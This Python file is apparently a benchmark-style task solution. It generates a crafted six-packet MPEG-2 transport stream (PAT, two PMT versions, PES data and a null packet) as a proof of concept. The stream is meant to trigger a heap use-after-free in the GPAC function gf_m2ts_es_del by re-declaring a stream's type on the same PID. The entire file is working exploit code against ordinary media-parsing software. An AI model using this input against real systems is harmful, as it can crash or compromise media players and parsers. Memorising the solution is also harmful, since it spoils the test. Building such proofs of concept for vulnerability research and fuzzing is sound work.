import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in gf_m2ts_es_del.
        Constructs a valid MPEG-2 TS stream with 6 packets (1128 bytes).
        Scenario: Declare ES, Send Data, Re-declare ES (triggering deletion of old), Send Data.
        """
        
        def mpeg_crc32(data):
            crc = 0xFFFFFFFF
            for byte in data:
                crc ^= (byte << 24)
                for _ in range(8):
                    if crc & 0x80000000:
                        crc = (crc << 1) ^ 0x04C11DB7
                    else:
                        crc <<= 1
                    crc &= 0xFFFFFFFF
            return crc

        def make_packet(pid, cc, payload, pusi=False):
            # Header
            # Sync Byte (0x47)
            h1 = 0x47
            # TEI(0), PUSI(1/0), Prio(0), PID_Hi(5)
            h2 = ((0x40 if pusi else 0x00) | ((pid >> 8) & 0x1F)) & 0xFF
            # PID_Lo
            h3 = pid & 0xFF
            # Scrambling(00), Adapt(01 - Payload), CC(4)
            h4 = (0x10 | (cc & 0x0F)) & 0xFF
            
            header = bytes([h1, h2, h3, h4])
            
            # Pad payload to 184 bytes with 0xFF
            target_len = 184
            if len(payload) > target_len:
                payload = payload[:target_len]
            
            pad_len = target_len - len(payload)
            return header + payload + (b'\xFF' * pad_len)

        packets = []

        # --- Packet 0: PAT ---
        # Define Program 1 -> PID 0x100
        # PID 0, CC 0, PUSI 1
        # Section: TableID(0), Len(13), TSID(1), Ver(0), Cur(1), Sec(0), Last(0)
        # Program: Num(1), PID(0x100)
        # Structure: 
        #   Header: 00 B0 0D 00 01 C1 00 00 (8 bytes)
        #   Prog:   00 01 E1 00 (4 bytes)
        #   CRC:    (4 bytes)
        sec = b'\x00' + b'\xB0\x0D' + b'\x00\x01' + b'\xC1' + b'\x00\x00'
        sec += b'\x00\x01' + b'\xE1\x00'
        crc = mpeg_crc32(sec)
        full_sec = sec + struct.pack('>I', crc)
        # Pointer field 0x00 before section
        packets.append(make_packet(0, 0, b'\x00' + full_sec, pusi=True))

        # --- Packet 1: PMT (Version 0) ---
        # Define ES: Type 0x0F (AAC), PID 0x101
        # PID 0x100, CC 0, PUSI 1
        # Structure:
        #   Header: 02 B0 12 00 01 C1 00 00 (8 bytes)
        #   PCR:    FF FF (2 bytes)
        #   ProgInfo: F0 00 (2 bytes)
        #   Stream: 0F E1 01 F0 00 (5 bytes)
        #   CRC:    (4 bytes)
        sec = b'\x02' + b'\xB0\x12' + b'\x00\x01' + b'\xC1' + b'\x00\x00'
        sec += b'\xFF\xFF' + b'\xF0\x00'
        sec += b'\x0F' + b'\xE1\x01' + b'\xF0\x00'
        crc = mpeg_crc32(sec)
        full_sec = sec + struct.pack('>I', crc)
        packets.append(make_packet(0x100, 0, b'\x00' + full_sec, pusi=True))

        # --- Packet 2: ES Data (PID 0x101) ---
        # Valid PES header to start stream context
        # PID 0x101, CC 0, PUSI 1
        pes = b'\x00\x00\x01\xC0\x00\x0A\x80\x00\x00' + b'\xAA'*10
        packets.append(make_packet(0x101, 0, pes, pusi=True))

        # --- Packet 3: PMT (Version 1) - TRIGGER ---
        # Redefine ES: Type 0x02 (Video), PID 0x101
        # Changing stream type for same PID forces gf_m2ts_es_del on old ES
        # PID 0x100, CC 1, PUSI 1
        # Ver(1) -> 0xC3
        sec = b'\x02' + b'\xB0\x12' + b'\x00\x01' + b'\xC3' + b'\x00\x00'
        sec += b'\xFF\xFF' + b'\xF0\x00'
        sec += b'\x02' + b'\xE1\x01' + b'\xF0\x00'
        crc = mpeg_crc32(sec)
        full_sec = sec + struct.pack('>I', crc)
        packets.append(make_packet(0x100, 1, b'\x00' + full_sec, pusi=True))

        # --- Packet 4: ES Data (PID 0x101) ---
        # Data packet for the re-declared PID. 
        # Triggers access to potentially freed structure if cleanup is mishandled.
        # PID 0x101, CC 1, PUSI 1
        pes = b'\x00\x00\x01\xE0\x00\x0A\x80\x00\x00' + b'\xBB'*10
        packets.append(make_packet(0x101, 1, pes, pusi=True))

        # --- Packet 5: Padding ---
        # PID 0x1FFF (Null), CC 0
        packets.append(make_packet(0x1FFF, 0, b''))

        return b''.join(packets)